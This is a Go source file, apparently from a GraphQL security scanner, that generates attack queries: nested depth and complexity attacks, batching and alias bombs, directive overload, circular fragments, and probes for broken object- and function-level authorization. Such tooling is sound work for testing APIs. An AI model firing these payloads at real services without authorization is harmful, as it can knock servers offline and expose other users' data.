package graphql

import (
	"fmt"
	"strings"
)

// AttackGenerator generates various GraphQL attack payloads
type AttackGenerator struct {
	schema *Schema
}

// NewAttackGenerator creates a new attack generator
func NewAttackGenerator(schema *Schema) *AttackGenerator {
	return &AttackGenerator{schema: schema}
}

// IntrospectionQuery returns the full introspection query for testing
func (g *AttackGenerator) IntrospectionQuery() string {
	return StandardIntrospectionQuery
}

// IntrospectionProbeQuery returns a minimal introspection probe
func (g *AttackGenerator) IntrospectionProbeQuery() string {
	return `{ __schema { queryType { name } } }`
}

// DepthAttackQuery generates a deeply nested query
func (g *AttackGenerator) DepthAttackQuery(fieldPath []string, depth int) string {
	if len(fieldPath) == 0 {
		fieldPath = []string{"node"}
	}

	var sb strings.Builder
	sb.WriteString("query DepthAttack { ")

	for i := 0; i < depth; i++ {
		field := fieldPath[i%len(fieldPath)]
		sb.WriteString(field)
		sb.WriteString(" { ")
	}

	sb.WriteString("id ")

	for i := 0; i < depth; i++ {
		sb.WriteString("} ")
	}

	sb.WriteString("}")
	return sb.String()
}

// BatchingAttackQuery generates a query with many aliased copies
func (g *AttackGenerator) BatchingAttackQuery(baseQuery string, count int) string {
	var sb strings.Builder
	sb.WriteString("query BatchAttack { ")

	for i := 0; i < count; i++ {
		sb.WriteString(fmt.Sprintf("q%d: %s ", i, baseQuery))
	}

	sb.WriteString("}")
	return sb.String()
}

// AliasBombQuery generates a query with exponential alias expansion
func (g *AttackGenerator) AliasBombQuery(fieldName string, count int) string {
	var sb strings.Builder
	sb.WriteString("query AliasBomb { ")

	for i := 0; i < count; i++ {
		sb.WriteString(fmt.Sprintf("a%d: %s ", i, fieldName))
	}

	sb.WriteString("}")
	return sb.String()
}

// FieldSuggestionQuery generates an invalid field query to elicit suggestions
func (g *AttackGenerator) FieldSuggestionQuery(typeName string) string {
	return fmt.Sprintf(`{ __type(name: "%s") { fields { name } } }`, typeName)
}

// DirectiveOverloadQuery generates a query with many directives
func (g *AttackGenerator) DirectiveOverloadQuery(fieldName string, directiveCount int) string {
	var directives []string
	for i := 0; i < directiveCount; i++ {
		directives = append(directives, "@include(if: true)")
	}

	return fmt.Sprintf("{ %s %s }", fieldName, strings.Join(directives, " "))
}

// CircularFragmentQuery generates a query with circular fragment references (if vulnerable)
func (g *AttackGenerator) CircularFragmentQuery() string {
	return `
query CircularFragment {
    __typename
    ...A
}
fragment A on Query { ...B }
fragment B on Query { ...A }
`
}

// ComplexityAttackQuery generates a query with high complexity score
func (g *AttackGenerator) ComplexityAttackQuery(fields []string, depth int) string {
	if len(fields) == 0 {
		fields = []string{"id", "name", "email", "createdAt", "updatedAt"}
	}

	var sb strings.Builder
	sb.WriteString("query ComplexityAttack { ")

	// Start with a top-level object field
	sb.WriteString("node { ")

	// Add many fields at each level
	for d := 0; d < depth; d++ {
		for _, field := range fields {
			sb.WriteString(field)
			sb.WriteString(" ")
		}
		if d < depth-1 {
			sb.WriteString("nested { ")
		}
	}

	// Close all the braces
	for d := 0; d < depth; d++ {
		sb.WriteString("} ")
	}

	sb.WriteString("}")
	return sb.String()
}

// BOLAProbeQuery generates a query to test for Broken Object Level Authorization
func (g *AttackGenerator) BOLAProbeQuery(fieldName, idField, victimID string) string {
	return fmt.Sprintf(`query BOLAProbe { %s(%s: "%s") { id } }`, fieldName, idField, victimID)
}

// BFLAProbeQuery generates a mutation to test for Broken Function Level Authorization
func (g *AttackGenerator) BFLAProbeQuery(mutationName string, args map[string]string) string {
	var argParts []string
	for key, value := range args {
		argParts = append(argParts, fmt.Sprintf(`%s: "%s"`, key, value))
	}

	argStr := ""
	if len(argParts) > 0 {
		argStr = fmt.Sprintf("(%s)", strings.Join(argParts, ", "))
	}

	return fmt.Sprintf("mutation BFLAProbe { %s%s { success } }", mutationName, argStr)
}

// DepthAttackQueryWithSchema generates a deeply nested query using actual schema relationships
func (g *AttackGenerator) DepthAttackQueryWithSchema(startField string, depth int) (string, error) {
	if g.schema == nil {
		return "", fmt.Errorf("schema is required for DepthAttackQueryWithSchema")
	}

	// Find the starting field in query type
	var startFieldDef *FieldDef
	for _, field := range g.schema.Queries {
		if field.Name == startField {
			startFieldDef = field
			break
		}
	}
	if startFieldDef == nil {
		return "", fmt.Errorf("field %s not found in schema", startField)
	}

	var sb strings.Builder
	sb.WriteString("query DepthAttack { ")

	// Build recursive query
	if err := g.buildRecursiveQuery(&sb, startFieldDef, depth, make(map[string]bool)); err != nil {
		return "", err
	}

	sb.WriteString(" }")
	return sb.String(), nil
}

// buildRecursiveQuery builds a recursive query by following object type relationships
func (g *AttackGenerator) buildRecursiveQuery(sb *strings.Builder, field *FieldDef, depthRemaining int, visited map[string]bool) error {
	// Get the base type name (unwrap List/NonNull)
	typeName := field.Type.GetTypeName()

	sb.WriteString(field.Name)
	sb.WriteString(" { ")

	if depthRemaining <= 0 {
		// At max depth, just select a scalar field
		sb.WriteString("id ")
		sb.WriteString("}")
		return nil
	}

	// Get the type definition
	typeDef, ok := g.schema.GetType(typeName)
	if !ok || typeDef.Kind != TypeKindObject {
		// Not an object, just select id
		sb.WriteString("id ")
		sb.WriteString("}")
		return nil
	}

	// Check if we're in a cycle (visited this type in the current path)
	if visited[typeName] {
		// Cycle detected, stop here with a scalar
		sb.WriteString("id ")
		sb.WriteString("}")
		return nil
	}

	// Find a field that returns an object type for recursion
	var recurseField *FieldDef
	for _, f := range typeDef.Fields {
		fieldTypeName := f.Type.GetTypeName()
		fieldType, ok := g.schema.GetType(fieldTypeName)
		if !ok {
			continue
		}

		// Look for object types
		if fieldType.Kind == TypeKindObject {
			recurseField = f
			break
		}
	}

	if recurseField != nil {
		// Mark current type as visited for this path
		visited[typeName] = true

		// Recurse into this field
		if err := g.buildRecursiveQuery(sb, recurseField, depthRemaining-1, visited); err != nil {
			return err
		}

		// Unmark for other branches
		delete(visited, typeName)
	} else {
		// No recursive field found, select a scalar
		sb.WriteString("id ")
	}

	sb.WriteString("}")
	return nil
}

// BatchingAttackQueryWithSchema generates a query with many aliased copies using schema info
func (g *AttackGenerator) BatchingAttackQueryWithSchema(baseField string, count int) (string, error) {
	if g.schema == nil {
		return "", fmt.Errorf("schema is required for BatchingAttackQueryWithSchema")
	}

	// Find the field in query type
	var fieldDef *FieldDef
	for _, field := range g.schema.Queries {
		if field.Name == baseField {
			fieldDef = field
			break
		}
	}
	if fieldDef == nil {
		return "", fmt.Errorf("field %s not found in schema", baseField)
	}

	// Determine if we need field selection
	typeName := fieldDef.Type.GetTypeName()
	needsSelection := false

	if typeDef, ok := g.schema.GetType(typeName); ok {
		needsSelection = typeDef.Kind == TypeKindObject
	}

	var sb strings.Builder
	sb.WriteString("query BatchAttack { ")

	for i := 0; i < count; i++ {
		sb.WriteString(fmt.Sprintf("q%d: %s", i, baseField))

		if needsSelection {
			// Add minimal field selection for object types
			sb.WriteString(" { id }")
		}

		sb.WriteString(" ")
	}

	sb.WriteString("}")
	return sb.String(), nil
}
